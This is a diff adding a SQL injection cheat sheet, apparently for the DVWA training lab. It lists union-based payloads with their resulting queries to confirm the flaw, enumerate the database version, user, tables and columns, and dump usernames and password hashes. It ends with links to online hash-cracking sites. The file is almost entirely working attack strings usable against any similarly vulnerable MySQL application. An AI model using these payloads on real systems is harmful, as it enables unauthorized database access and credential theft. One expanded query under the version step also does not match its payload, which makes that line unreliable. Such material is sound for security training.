@@ -1,0 +1,63 @@
+TEST IF VULNERABLE:
+
+%' or '0'='0
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
+
+--------------------------------------------------------------------------------------------------------------
+SEE DB VERSION:
+
+%' or 0=0 union select null, version() #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' or select null, version() #
+
+--------------------------------------------------------------------------------------------------------------
+SEE CURRENT USER:
+
+%' or 0=0 union select null, user() #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' or 0=0 union select null, user() #
+
+--------------------------------------------------------------------------------------------------------------
+SEE CURRENT DATABASE:
+
+%' or 0=0 union select null, database() #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' or 0=0 union select null, database() #
+
+--------------------------------------------------------------------------------------------------------------
+SEE ALL TABLES:
+
+%' and 1=0 union select null, table_name from information_schema.tables #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' and 1=0 union select null, table_name from information_schema.tables #
+
+--------------------------------------------------------------------------------------------------------------
+SEE ALL TABLES WITH 'user' IN THE NAME:
+
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+
+--------------------------------------------------------------------------------------------------------------
+SEE THE COLUMN NAMES IN users TABLE:
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+--------------------------------------------------------------------------------------------------------------
+
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+SELECT first_name, last_name FROM users WHERE user_id = '%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+---------------------------------         OR        ----------------------------------------------------------
+
+a' UNION ALL SELECT first_name, password from dvwa.users;#'
+
+
+https://www.onlinehashcrack.com/hash-identification.php
+
+https://www.md5online.org/md5-decrypt.html
+
+NOTES: 0x0a = NEW LINE ( for formatting )
